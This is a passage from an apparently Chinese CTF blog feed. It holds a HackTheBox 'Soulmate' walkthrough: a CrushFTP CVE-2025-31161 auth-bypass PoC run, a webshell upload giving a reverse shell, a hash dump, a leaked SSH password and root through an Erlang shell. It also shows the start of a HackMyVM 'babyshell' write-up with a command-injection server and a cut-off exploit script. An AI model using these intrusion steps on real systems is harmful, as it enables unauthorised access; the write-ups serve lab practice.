class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:             http://soulmate.htb/<br>[+] Method:          GET<br>[+] Threads:         30<br>[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:      gobuster/3.6<br>[+] Timeout:         10s<br>[+] Append Domain:   true<br>===============================================================<br>Starting gobuster in VHOST enumeration mode<br>===============================================================<br>Found: ftp.soulmate.htb Status: 302 [Size: 0] [--&gt; /WebInterface/login.html]<br><br></code></pre></td></tr></table></figure><p>访问子域名发现是curshFTP的登录界面。</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>搜索对应exp，添加任意用户</p><p><a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">Immersive-Labs-Sec&#x2F;CVE-2025-31161: Proof of Concept for CVE-2025-31161 &#x2F; CVE-2025-2825</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python cve-<span class="hljs-number">2025</span>-<span class="hljs-number">31161</span><span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target_host</span> ftp<span class="hljs-selector-class">.soulmate</span><span class="hljs-selector-class">.htb</span> <span class="hljs-attr">--port</span> <span class="hljs-number">80</span> <span class="hljs-attr">--target_user</span> root <span class="hljs-attr">--new_user</span> kaada <span class="hljs-attr">--password</span> <span class="hljs-number">123456</span> <br><span class="hljs-selector-attr">[+]</span> Preparing Payloads<br>  <span class="hljs-selector-attr">[-]</span> Warming up the target<br>  <span class="hljs-selector-attr">[-]</span> Target is up and running<br><span class="hljs-selector-attr">[+]</span> Sending Account Create Request<br>  <span class="hljs-selector-attr">[!]</span> User created successfully<br><span class="hljs-selector-attr">[+]</span> Exploit Complete you can now login with<br>   <span class="hljs-selector-attr">[*]</span> Username: kaada<br>   <span class="hljs-selector-attr">[*]</span> Password: <span class="hljs-number">123456</span>.<br>                             <br></code></pre></td></tr></table></figure><p>登录之后访问管理员界面，可以修改其他用户的密码。</p><p><img src="/2025/11/17/HackTheBox-Soulmate/cloudmusic_mGoRJHO9QJ.png"></p><p>ben用户可以上传文件。</p><p><img src="/2025/11/17/HackTheBox-Soulmate/vmware_xqFYOSHsQm.png"></p><p>实际上这里对应的是soulhtb的主目录，上传一句话马弹shell。</p><p><img src="/2025/11/17/HackTheBox-Soulmate/vmware_75V3KEGVdL.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">➤  🏠 <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">Menu</span> (m) 💀 Payloads (<span class="hljs-selector-tag">p</span>) 🔄 <span class="hljs-attribute">Clear</span> (Ctrl-L) 🚫 Quit (<span class="hljs-selector-tag">q</span>/Ctrl-C)<br><span class="hljs-selector-attr">[+]</span> Got reverse shell <span class="hljs-selector-tag">from</span> soulmate-<span class="hljs-number">10.10</span>.<span class="hljs-number">11.86</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br><span class="hljs-selector-attr">[+]</span> Attempting <span class="hljs-selector-tag">to</span> upgrade shell <span class="hljs-selector-tag">to</span> PTY...<br><span class="hljs-selector-attr">[+]</span> Shell upgraded successfully using /usr/bin/python3! 💪<br><span class="hljs-selector-attr">[+]</span> Interacting with session <span class="hljs-selector-attr">[1]</span>, Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/soulmate~<span class="hljs-number">10.10</span>.<span class="hljs-number">11.86</span>_Linux_x86_64/<span class="hljs-number">2025</span>_11_16-<span class="hljs-number">19</span>_42_50-<span class="hljs-number">664</span>.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>www-data@soulmate:~/soulmate.htb/public$ <br><br></code></pre></td></tr></table></figure><p>网站根目录下得到管理员密码哈希</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db <br><span class="hljs-attribute">SQLite</span> version <span class="hljs-number">3</span>.<span class="hljs-number">37</span>.<span class="hljs-number">2</span> <span class="hljs-number">2022</span>-<span class="hljs-number">01</span>-<span class="hljs-number">06</span> <span class="hljs-number">13</span>:<span class="hljs-number">25</span>:<span class="hljs-number">41</span><br><span class="hljs-attribute">Enter</span> <span class="hljs-string">&quot;.help&quot;</span> for usage hints.<br><span class="hljs-attribute">sqlite</span>&gt; .tables<br><span class="hljs-attribute">users</span><br><span class="hljs-attribute">sqlite</span>&gt; select * from users;<br><span class="hljs-attribute">1</span>|admin|$<span class="hljs-number">2</span>y$<span class="hljs-number">12</span>$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|<span class="hljs-number">1</span>|Administrator|||||<span class="hljs-number">2025</span>-<span class="hljs-number">08</span>-<span class="hljs-number">10</span> <span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">08</span>|<span class="hljs-number">2025</span>-<span class="hljs-number">08</span>-<span class="hljs-number">10</span> <span class="hljs-number">12</span>:<span class="hljs-number">59</span>:<span class="hljs-number">39</span><br><span class="hljs-attribute">sqlite</span>&gt; <br></code></pre></td></tr></table></figure><p>但是爆破不出来。</p><h3 id="GetBen"><a href="#GetBen" class="headerlink" title="GetBen"></a>GetBen</h3><hr><p>上传linpeas进一步分析，发现root用户执行了一个自定义脚本。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>        <span class="hljs-number">1076</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">1</span>.<span class="hljs-number">4</span> <span class="hljs-number">2253504</span> <span class="hljs-number">57000</span> ?       Ssl  Nov16   <span class="hljs-number">0</span>:<span class="hljs-number">09</span> /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-<span class="hljs-number">15</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125; -- -extra /usr/local/lib/erlang_login/start.escript<br><br></code></pre></td></tr></table></figure><p>其中得到ben用户密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">www-data@soulmate:~/soulmate.htb/<span class="hljs-built_in">public</span>$ cat /usr/<span class="hljs-keyword">local</span>/lib/erlang_login/<span class="hljs-keyword">start</span>.escript<br>#!/usr/bin/env escript<br>%%! -sname ssh_runner<br><br>main(_) -&gt;<br>    application:<span class="hljs-keyword">start</span>(asn1),<br>    application:<span class="hljs-keyword">start</span>(crypto),<br>    application:<span class="hljs-keyword">start</span>(public_key),<br>    application:<span class="hljs-keyword">start</span>(ssh),<br><br>    io:format(&quot;Starting SSH daemon with logging...~n&quot;),<br><br>    <span class="hljs-keyword">case</span> ssh:daemon(<span class="hljs-number">2222</span>, [<br>        &#123;ip, &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;&#125;,<br>        &#123;system_dir, &quot;/etc/ssh&quot;&#125;,<br><br>        &#123;user_dir_fun, fun(<span class="hljs-keyword">User</span>) -&gt;<br>            Dir = filename:<span class="hljs-keyword">join</span>(&quot;/home&quot;, <span class="hljs-keyword">User</span>),<br>            io:format(&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;, [<span class="hljs-keyword">User</span>, Dir]),<br>            filename:<span class="hljs-keyword">join</span>(Dir, &quot;.ssh&quot;)<br>        <span class="hljs-keyword">end</span>&#125;,<br><br>        &#123;connectfun, fun(<span class="hljs-keyword">User</span>, PeerAddr, <span class="hljs-keyword">Method</span>) -&gt;<br>            io:format(&quot;Auth success for user: ~p from ~p via ~p~n&quot;,<br>                      [<span class="hljs-keyword">User</span>, PeerAddr, <span class="hljs-keyword">Method</span>]),<br>            <span class="hljs-keyword">true</span><br>        <span class="hljs-keyword">end</span>&#125;,<br><br>        &#123;failfun, fun(<span class="hljs-keyword">User</span>, PeerAddr, Reason) -&gt;<br>            io:format(&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;,<br>                      [<span class="hljs-keyword">User</span>, PeerAddr, Reason]),<br>            <span class="hljs-keyword">true</span><br>        <span class="hljs-keyword">end</span>&#125;,<br><br>        &#123;auth_methods, &quot;publickey,password&quot;&#125;,<br><br>        &#123;user_passwords, [&#123;&quot;ben&quot;, &quot;HouseH0ldings998&quot;&#125;]&#125;,<br>        &#123;idle_time, <span class="hljs-keyword">infinity</span>&#125;,<br>        &#123;max_channels, <span class="hljs-number">10</span>&#125;,<br>        &#123;max_sessions, <span class="hljs-number">10</span>&#125;,<br>        &#123;parallel_login, <span class="hljs-keyword">true</span>&#125;<br>    ]) <span class="hljs-keyword">of</span><br>        &#123;ok, _Pid&#125; -&gt;<br>            io:format(&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;);<br>        &#123;error, Reason&#125; -&gt;<br>            io:format(&quot;Failed to start SSH daemon: ~p~n&quot;, [Reason])<br>    <span class="hljs-keyword">end</span>,<br><br>    receive<br>        stop -&gt; ok<br>    <span class="hljs-keyword">end</span>.<br><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>查看进程，发现基于erlang的ssh服务，是root开启的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">00</span>:<span class="hljs-number">34</span>:<span class="hljs-number">06</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1076</span>   | /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-<span class="hljs-number">15</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125; -- -extra /usr/local/lib/erlang_login/start.escript  <br></code></pre></td></tr></table></figure><p>开放端口为2222</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">ben@soulmate:~$ ssh -p <span class="hljs-number">2222</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">&#x27;[127.0.0.1]:2222 ([127.0.0.1]:2222)&#x27; can&#x27;t be established.</span><br>ED25519 <span class="hljs-keyword">key</span> fingerprint <span class="hljs-built_in">is</span> SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.<br>This host <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> known <span class="hljs-keyword">by</span> the following other names/addresses:<br>    ~/.ssh/known_hosts:<span class="hljs-number">1</span>: [hashed name]<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes<br><span class="hljs-symbol">Warning:</span> Permanently added <span class="hljs-comment">&#x27;[127.0.0.1]:2222&#x27; (ED25519) to the list of known hosts.</span><br>ben@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">&#x27;s password: </span><br>Eshell V15.<span class="hljs-number">2.5</span> (press Ctrl+G <span class="hljs-keyword">to</span> abort, type help(). <span class="hljs-keyword">for</span> help)<br>(ssh_runner@soulmate)<span class="hljs-number">1</span>&gt; <br><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">(ssh_runner@soulmate)<span class="hljs-number">1</span>&gt; m().<br>Module                <span class="hljs-keyword">File</span><br>application           <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>application.beam<br>application_controll  <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>application_controller.beam<br>application_master    <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>application_master.beam<br>atomics               preloaded<br>...<br>os                    <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>os.beam<br><br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">(ssh_runner<span class="hljs-meta">@soulmate</span>)<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> os:cmd(<span class="hljs-string">&quot;id&quot;</span>).<br>(ssh_runner<span class="hljs-meta">@soulmate</span>)<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> os:cmd(<span class="hljs-string">&quot;id&quot;</span>).<br><span class="hljs-string">&quot;uid=0(root) gid=0(root) groups=0(root)<span class="hljs-subst">\n</span>&quot;</span><br>(ssh_runner<span class="hljs-meta">@soulmate</span>)<span class="hljs-number">3</span><span class="hljs-operator">&gt;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackmyVm-babyshell</title>
    <link href="/2025/11/09/HackmyVm-babyshell/"/>
    <url>/2025/11/09/HackmyVm-babyshell/</url>
    
    <content type="html"><![CDATA[<p>呜呜呜我的首杀….</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ./rustscan -a 192.168.56.186<br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;<br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> --------------------------------------<br>Breaking and entering... into the world of open ports.<br><br>[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br>[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers<br>[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. <br>Open 192.168.56.186:22<br>Open 192.168.56.186:80<br>[~] Starting Script(s)<br>[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 02:06 EST<br>Initiating ARP Ping Scan at 02:06<br>Scanning 192.168.56.186 [1 port]<br>Completed ARP Ping Scan at 02:06, 0.06s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 02:06<br>Completed Parallel DNS resolution of 1 host. at 02:06, 0.00s elapsed<br>DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br>Initiating SYN Stealth Scan at 02:06<br>Scanning 192.168.56.186 [2 ports]<br>Discovered open port 22/tcp on 192.168.56.186<br>Discovered open port 80/tcp on 192.168.56.186<br>Completed SYN Stealth Scan at 02:06, 0.02s elapsed (3 total ports)<br>Nmap scan report for 192.168.56.186<br>Host is up, received arp-response (0.00077s latency).<br>Scanned at 2025-11-09 02:06:09 EST for 0s<br><br>PORT     STATE SERVICE        REASON<br>22/tcp   open  ssh            syn-ack ttl 64<br>80/tcp   open  http           syn-ack ttl 64<br>MAC Address: 08:00:27:26:4C:B3 (Oracle VirtualBox virtual NIC)<br><br>Read data files from: /usr/share/nmap<br>Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds<br>           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirsearch -u 192.168.56.186     <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.186/_25-11-09_02-07-53.txt<br><br>Target: http://192.168.56.186/<br><br>[02:07:53] Starting:                                                                                                                                       <br>[02:07:53] 403 -  279B  - /.ht_wsr.txt                                      <br>[02:07:53] 403 -  279B  - /.htaccess.bak1                                   <br>[02:07:53] 403 -  279B  - /.htaccess.orig                                   <br>[02:07:53] 403 -  279B  - /.htaccess.sample<br>[02:07:53] 403 -  279B  - /.htaccess.save<br>[02:07:53] 403 -  279B  - /.htaccess_sc                                     <br>[02:07:54] 403 -  279B  - /.htaccess_extra<br>[02:07:54] 403 -  279B  - /.htaccess_orig                                   <br>[02:07:54] 403 -  279B  - /.htaccessOLD<br>[02:07:54] 403 -  279B  - /.htaccessBAK<br>[02:07:54] 403 -  279B  - /.htaccessOLD2<br>[02:07:54] 403 -  279B  - /.htm                                             <br>[02:07:54] 403 -  279B  - /.html<br>[02:07:54] 403 -  279B  - /.htpasswd_test                                   <br>[02:07:54] 403 -  279B  - /.httr-oauth<br>[02:07:54] 403 -  279B  - /.htpasswds                                       <br>[02:07:54] 403 -  279B  - /.php                                             <br>[02:07:59] 200 -    1KB - /backup.zip                                       <br>[02:08:10] 403 -  279B  - /server-status                                    <br>[02:08:10] 403 -  279B  - /server-status/<br><br></code></pre></td></tr></table></figure><p>有backup文件，下载下来发现是个ICMP服务的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> http.server<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnerableHTTPRequestHandler</span>(http.server.SimpleHTTPRequestHandler):<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        parsed_path = urllib.parse.urlparse(<span class="hljs-variable language_">self</span>.path)<br>        query_params = urllib.parse.parse_qs(parsed_path.query)<br>        <br>        <span class="hljs-keyword">if</span> parsed_path.path == <span class="hljs-string">&#x27;/execute&#x27;</span>:<br>            cmd = query_params.get(<span class="hljs-string">&#x27;cmd&#x27;</span>, [<span class="hljs-string">&#x27;&#x27;</span>])[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> cmd:<br>                <span class="hljs-keyword">try</span>:<br>                    result = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>, stderr=subprocess.STDOUT, text=<span class="hljs-literal">True</span>)<br>                    <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">200</span>)<br>                    <span class="hljs-variable language_">self</span>.send_header(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>                    <span class="hljs-variable language_">self</span>.end_headers()<br>                    <span class="hljs-variable language_">self</span>.wfile.write(result.encode())<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">500</span>)<br>                    <span class="hljs-variable language_">self</span>.end_headers()<br>                    <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>.encode())<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">400</span>)<br>                <span class="hljs-variable language_">self</span>.end_headers()<br>                <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">b&quot;cmd parameter required&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        <span class="hljs-comment"># 首页返回空响应</span><br>        <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">200</span>)<br>        <span class="hljs-variable language_">self</span>.end_headers()<br>        <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">b&quot;&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    PORT = <span class="hljs-number">8080</span><br>    HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>    <br>    <span class="hljs-keyword">with</span> socketserver.TCPServer((HOST, PORT), VulnerableHTTPRequestHandler) <span class="hljs-keyword">as</span> httpd:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Server running on http://<span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>&quot;</span>)<br>        httpd.serve_forever()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="GetZero"><a href="#GetZero" class="headerlink" title="GetZero"></a>GetZero</h3><hr><p>拷打ai写对应的利用exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"> cat exp.py <br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> ICMP, IP, Raw, send, sniff<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ICMPClient</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_ip, iface=<span class="hljs-string">&quot;eth0&quot;</span></span>):<br>     